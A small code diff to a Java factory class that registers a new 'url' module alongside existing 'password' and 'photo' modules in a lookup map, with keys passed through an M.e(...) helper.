@@ -42,6 +42,7 @@ public class FactoryModule implements AbstractFactory<BaseModule, String> {
 		factorymap.put(M.e("password"), ModulePassword.class);
 
 		factorymap.put(M.e("photo"), ModulePhoto.class);
+		factorymap.put(M.e("url"), ModuleUrl.class);
 
 		Enumeration<String> en = factorymap.keys();
 		while (en.hasMoreElements()) {
